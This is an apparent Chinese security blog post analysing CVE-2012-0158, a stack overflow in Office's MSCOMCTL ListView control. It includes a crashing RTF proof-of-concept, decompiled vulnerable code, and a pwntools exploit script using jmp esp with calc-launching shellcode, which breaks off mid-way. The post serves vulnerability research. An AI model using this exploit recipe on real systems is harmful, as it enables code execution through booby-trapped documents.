<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="环境： 12Windows 10office 2007 Analyze样本poc.doc： 1234567891011&amp;#123;\rtf1&amp;#123;\fonttbl&amp;#123;\f0\fnil\fcharset0 Verdana;&amp;#125;&amp;#125;\viewkind4\uc1\pard\sb100\sa100\lang9\f0\fs22\par\pard\sa200\sl276\slmu">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2012-0158 Office Stack Overflow">
<meta property="og:url" content="http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/index.html">
<meta property="og:site_name" content="Kirin&#39;s Blog">
<meta property="og:description" content="环境： 12Windows 10office 2007 Analyze样本poc.doc： 1234567891011&amp;#123;\rtf1&amp;#123;\fonttbl&amp;#123;\f0\fnil\fcharset0 Verdana;&amp;#125;&amp;#125;\viewkind4\uc1\pard\sb100\sa100\lang9\f0\fs22\par\pard\sa200\sl276\slmu">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9027235-c7f988d063d55953.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9027235-817ab4a2e8d1b6b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9027235-d8a8aae9a3328e68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9027235-0e55e3da4d77385f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9027235-50c0e477637521e4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9027235-d7b0caed36492aae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9027235-89c4caa300bca6d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9027235-8e645a3a932314a1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9027235-deb3a2357b6b30c9.gif?imageMogr2/auto-orient/strip">
<meta property="article:published_time" content="2019-03-01T14:51:04.000Z">
<meta property="article:modified_time" content="2019-05-16T14:52:24.000Z">
<meta property="article:author" content="Kirin">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/9027235-c7f988d063d55953.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
    
    
        
          
              <link rel="shortcut icon" href="/images/logo.jpg">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/logo.jpg" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.jpg">
          
        
    
    <!-- title -->
    <title>CVE-2012-0158 Office Stack Overflow</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/03/02/CVE-2013-0750-Firefox/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/02/26/The-Way-to-Bypass-Canary/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/&text=CVE-2012-0158 Office Stack Overflow" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/&title=CVE-2012-0158 Office Stack Overflow" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/&is_video=false&description=CVE-2012-0158 Office Stack Overflow" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2012-0158 Office Stack Overflow&body=Check out this article: http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/&title=CVE-2012-0158 Office Stack Overflow" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/&title=CVE-2012-0158 Office Stack Overflow" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/&title=CVE-2012-0158 Office Stack Overflow" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/&title=CVE-2012-0158 Office Stack Overflow" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/&name=CVE-2012-0158 Office Stack Overflow&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyze"><span class="toc-number">1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">2.</span> <span class="toc-text">POC</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        CVE-2012-0158 Office Stack Overflow
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kirin's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-03-01T14:51:04.000Z" itemprop="datePublished">2019-03-01</time>
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>环境：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows 10</span><br><span class="line">office 2007</span><br></pre></td></tr></table></figure>
<h2 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h2><p>样本poc.doc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;\rtf1</span><br><span class="line">&#123;\fonttbl&#123;\f0\fnil\fcharset0 Verdana;&#125;&#125;</span><br><span class="line">\viewkind4\uc1\pard\sb100\sa100\lang9\f0\fs22\par</span><br><span class="line">\pard\sa200\sl276\slmult1\lang9\fs22\par</span><br><span class="line">&#123;\object\objocx</span><br><span class="line">&#123;\*\objdata</span><br><span class="line">01050000020000001B0000004D53436F6D63746C4C69622E4C697374566965774374726C2E32000000000000000000000E0000</span><br><span class="line">D0CF11E0A1B11AE1000000000000000000000000000000003E000300FEFF0900060000000000000000000000010000000100000000000000001000000200000001000000FEFFFFFF0000000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDFFFFFFFEFFFFFFFEFFFFFF0400000005000000FEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF52006F006F007400200045006E00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500FFFFFFFFFFFFFFFF020000004BF0D1BD8B85D111B16A00C0F02836280000000062eaDFB9340DCD014559DFB9340DCD0103000000000600000000000003004F0062006A0049006E0066006F0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000200FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000003004F00430058004E0041004D004500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000FFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000001000000160000000000000043006F006E00740065006E007400730000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000200FFFFFFFFFFFFFFFFFFFFFFFF000000000000000000000000000000000000000000000000000000000000000000000000020000007E05000000000000FEFFFFFFFEFFFFFF030000000400000005000000060000000700000008000000090000000A0000000B0000000C0000000D0000000E0000000F0000001000000011000000120000001300000014000000150000001600000017000000FEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF009203000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004C00690073007400560069006500770041000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000021433412080000006ab0822cbb0500004E087DEB010006001C000000000000000000000000060001560A000001EFCDAB00000500985D6501070000000800008005000080000000000000000000000000000000001FDEECBD010005009017190000000800000049746D736400000002000000010000000C000000436F626A640000008282000082820000000000000000000000000000414141410000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接打开样本office会crash<br>在此过程中用windbg附加进程：<br><img src="https://upload-images.jianshu.io/upload_images/9027235-c7f988d063d55953.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Windbg"><br>可以看到ip被劫持到0x41414141，很明显是通过”AAAA”覆盖了返回地址<br>直接查看调用堆栈没有信息<br>查看栈内信息，看到最近的一处函数地址在MSCOMCTL.OCX：<br><img src="https://upload-images.jianshu.io/upload_images/9027235-817ab4a2e8d1b6b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Windbg"><br>找到符号信息文件MSCOMCTL.dbg，和MSCOMCTL.OCX放到同一位置，ida载入，跳到栈内地址位置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">HRESULT __stdcall CObj::Load(CObj *this, BSTR bstrString)</span><br><span class="line">&#123;</span><br><span class="line">  struct IStream *v2; &#x2F;&#x2F; ebx</span><br><span class="line">  HRESULT result; &#x2F;&#x2F; eax</span><br><span class="line">  HRESULT v4; &#x2F;&#x2F; esi</span><br><span class="line">  char v5[4]; &#x2F;&#x2F; [esp+Ch] [ebp-14h]</span><br><span class="line">  SIZE_T dwBytes; &#x2F;&#x2F; [esp+14h] [ebp-Ch]</span><br><span class="line">  char v7[4]; &#x2F;&#x2F; [esp+18h] [ebp-8h]</span><br><span class="line">  int v8; &#x2F;&#x2F; [esp+1Ch] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; (struct IStream *)bstrString;</span><br><span class="line">  result &#x3D; ReadBytesFromStreamPadded(v5, (struct IStream *)bstrString, 0xCu);</span><br><span class="line">  if ( result &gt;&#x3D; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(_DWORD *)v5 &#x3D;&#x3D; &#39;jboC&#39; &amp;&amp; dwBytes &gt;&#x3D; 8 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 &#x3D; ReadBytesFromStreamPadded(v7, v2, dwBytes);&#x2F;&#x2F; 实现copy操作</span><br><span class="line">      if ( v4 &gt;&#x3D; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( !*(_DWORD *)v7 )</span><br><span class="line">          goto LABEL_8;</span><br><span class="line">        bstrString &#x3D; 0;</span><br><span class="line">        v4 &#x3D; ReadBstrFromStreamPadded((UINT)&amp;bstrString, v2);</span><br><span class="line">        if ( v4 &gt;&#x3D; 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          CObj::SetKey((CObj *)((char *)this - 36), bstrString);</span><br><span class="line">          SysFreeString(bstrString);</span><br><span class="line">LABEL_8:</span><br><span class="line">          if ( v8 )</span><br><span class="line">            v4 &#x3D; ReadVariantFromStream((struct tagVARIANT *)((char *)this + 20), v2);</span><br><span class="line">          return v4;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      return v4;</span><br><span class="line">    &#125;</span><br><span class="line">    result &#x3D; 0x8000FFFF;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ida下attach动态调试看到程序正是在CObj::Load返回时栈内返回地址被覆盖为”AAAA”<br>在这里，程序会调用ReadBytesFromStreamPadded(v5, (struct IStream *)bstrString, 0xCu)将ole对象中Contents流数据开始0xC复制到栈上，对应v5为数据头，检测其为”Cobj”，而后紧跟着是数据的长度，其被复制到dwBytes位置，检测其大小不小于8后，将其中对应大小复制到栈上，此时因为dwBytes可控，当复制长度大于栈内预留空间时便会导致栈溢出<br>重新看一下样本文件：<br>RTF格式，具体参考：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;161753.html</span><br></pre></td></tr></table></figure>
<p>offvis直接打开无法识别OLE数据：<br><img src="https://upload-images.jianshu.io/upload_images/9027235-d8a8aae9a3328e68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="OLE"><br>这是因为OLE数据以hex流存储<br>将D0CF11E(标识OLE头)后的hex流提取保存重新识别<br>首先使用OleFileView或者oletools查看文件<br>主要看到有三个流：<br><img src="https://upload-images.jianshu.io/upload_images/9027235-0e55e3da4d77385f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Stream"><br>可以看到CXNAME主要声明是一个ListViewA控件，通过其对应的clsid对应的注册表也可以看到：<br><img src="https://upload-images.jianshu.io/upload_images/9027235-50c0e477637521e4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="clsid"><br><img src="https://upload-images.jianshu.io/upload_images/9027235-d7b0caed36492aae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="mscomctl"><br>可以看到对应处理位置位于MSCOMCTL<br>所以整个问题位于MSCOMCTL处理ListViewA控件过程中，处理Contents流时，在判断头”Cobjd”后直接按照文件中定义的长度将后面数据直接复制到栈中从而造成栈溢出</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>样本中的长度设置为0x8282因此可以直接容下整个shellcode，我们只需要将原本crash的AAAA修改为jmp esp并在栈内写入shellcode即可(MSCOMCTL.OCX不存在保护)，针，动态调试在MSCOMCTL.OCX中搜索”\xFF\xE4”(jmp esp),找到后填入shellcode再针对Windows10设置特定调用函数地址即可:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WinExec(&quot;calc.exe&quot;, 5)</span><br><span class="line">ExitProcess(0)</span><br></pre></td></tr></table></figure>
<p>windbg或者dllexp找到函数地址：<br><img src="https://upload-images.jianshu.io/upload_images/9027235-89c4caa300bca6d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="windbg"><br><img src="https://upload-images.jianshu.io/upload_images/9027235-8e645a3a932314a1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="dllexp"><br><strong>EXP:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">shellcode&#x3D;asm(&quot;push ebp\n\</span><br><span class="line">		mov ebp,esp\n\</span><br><span class="line">		xor eax,eax\n\</span><br><span class="line">		push eax\n\</span><br><span class="line">		mov eax,0x6578652e\n\</span><br><span class="line">		push eax\n\</span><br><span class="line">		mov eax,0x636c6163\n\</span><br><span class="line">		push eax\n\</span><br><span class="line">		mov eax,esp\n\</span><br><span class="line">		push 5\n\</span><br><span class="line">		push eax\n\</span><br><span class="line">		mov eax,0x753039f0&#x2F;*address of WinExec*&#x2F;\n\</span><br><span class="line">		call eax\n\</span><br><span class="line">		xor eax,eax\n\</span><br><span class="line">		push eax\n\</span><br><span class="line">		mov eax,0x752c3a20&#x2F;*address of ExitProcess*&#x2F;\n\</span><br><span class="line">		call eax\n\</span><br><span class="line">		mov esp,ebp\n\</span><br><span class="line">		pop ebp&quot;)</span><br><span class="line">jmp_esp&#x3D;&quot;\x5b\xc0\x63\x27\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">shellcode&#x3D;jmp_esp+shellcode</span><br><span class="line">shellcode_str&#x3D;shellcode.encode(&quot;hex&quot;)</span><br><span class="line">with open(&quot;.&#x2F;poc.doc&quot;,&quot;rb+&quot;) as f:</span><br><span class="line">	ans&#x3D;f.read()</span><br><span class="line">	index&#x3D;ans.find(&quot;41414141&quot;)</span><br><span class="line">	